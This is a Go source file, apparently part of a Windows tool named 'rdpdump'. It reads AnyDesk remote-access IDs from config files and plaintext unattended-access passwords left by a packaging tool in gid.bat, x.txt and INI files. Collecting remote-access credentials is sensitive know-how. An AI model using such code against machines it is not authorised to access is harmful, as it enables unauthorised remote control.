//go:build windows

package rdpdump

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

var (
	anyDeskIDRe       = regexp.MustCompile(`\b(\d{7,12})\b`)
	anyDeskPasswordRe = regexp.MustCompile(`密码\s*[:：]\s*([^\s>]+)`)
)

// AnyDesk 读取 AnyDesk 地址与密码
func AnyDesk(hintDir string) Info {
	info := Info{
		Code:     anyDeskID(hintDir),
		Password: anyDeskPassword(hintDir),
	}
	return info
}

// anyDeskID 读取 AnyDesk 地址
//
// 只读配置文件里的 ad.anynet.id，不再调用 --get-id：该参数每次都会拉起
// 一份完整的 AnyDesk 实例（app.service / anynet 全部初始化），与已安装的
// 服务实例抢占监听套接字和 C:\ProgramData\AnyDesk，日志表现为
// anynet.relay_connector 反复 bootstrap 后 Fatal Program Failure。
// 地址在客户端注册后必然落盘，读不到时留空、下一轮再读。
func anyDeskID(hintDir string) string {
	for _, path := range anyDeskConfigPaths(hintDir) {
		values := readINI(path)
		if id := firstNonEmpty(values["ad.anynet.id"], values["anynet.id"]); id != "" {
			if match := anyDeskIDRe.FindStringSubmatch(id); match != nil {
				return match[1]
			}
		}
	}
	return ""
}

// anyDeskConfigPaths 返回待读取的 AnyDesk 配置文件
//
// 自定义客户端（AnyDesk-<前缀>）的配置目录同样带前缀，ProgramData 下要通配。
func anyDeskConfigPaths(hintDir string) []string {
	paths := make([]string, 0, 6)
	if hintDir != "" {
		paths = append(paths, filepath.Join(hintDir, "system.conf"))
	}
	if programData := os.Getenv("ProgramData"); programData != "" {
		paths = append(paths, filepath.Join(programData, "AnyDesk", "system.conf"))
		if matches, err := filepath.Glob(filepath.Join(programData, "AnyDesk*", "system.conf")); err == nil {
			paths = append(paths, matches...)
		}
	}
	if appData := os.Getenv("APPDATA"); appData != "" {
		paths = append(paths, filepath.Join(appData, "AnyDesk", "user.conf"))
	}
	return dedupePaths(paths)
}

// anyDeskPassword 读取 AnyDesk 固定密码
//
// AnyDesk 的无人值守密码在配置里是加盐哈希，无法反解；
// 这里读取打包工具（被控端）留下的明文密码：gid.bat / anydesk.ini / x.txt。
func anyDeskPassword(hintDir string) string {
	if hintDir == "" {
		return ""
	}

	// 1. 打包工具生成的 gid.bat：echo 密码：xxxx（GBK 编码）
	if data, err := os.ReadFile(filepath.Join(hintDir, "gid.bat")); err == nil {
		if match := anyDeskPasswordRe.FindStringSubmatch(decodeLocalText(data)); match != nil {
			return strings.TrimSpace(match[1])
		}
	}

	// 2. 配置文件 anydesk.ini / config.ini / 配置.ini
	for _, name := range []string{"anydesk.ini", "config.ini", "配置.ini"} {
		values := readINI(filepath.Join(hintDir, name))
		if password := firstNonEmpty(values["password"], values["pwd"], values["密码"]); password != "" {
			return password
		}
	}

	// 3. 打包工具生成的 x.txt
	if data, err := os.ReadFile(filepath.Join(hintDir, "x.txt")); err == nil {
		if match := anyDeskPasswordRe.FindStringSubmatch(decodeLocalText(data)); match != nil {
			return strings.TrimSpace(match[1])
		}
	}

	// 4. system.conf 中的明文密码（通常只有哈希，命中即用）
	for _, path := range anyDeskConfigPaths(hintDir) {
		if strings.HasSuffix(strings.ToLower(path), "user.conf") {
			continue
		}
		values := readINI(path)
		if password := firstNonEmpty(values["ad.anynet.pwd"]); password != "" {
			return password
		}
	}

	return ""
}
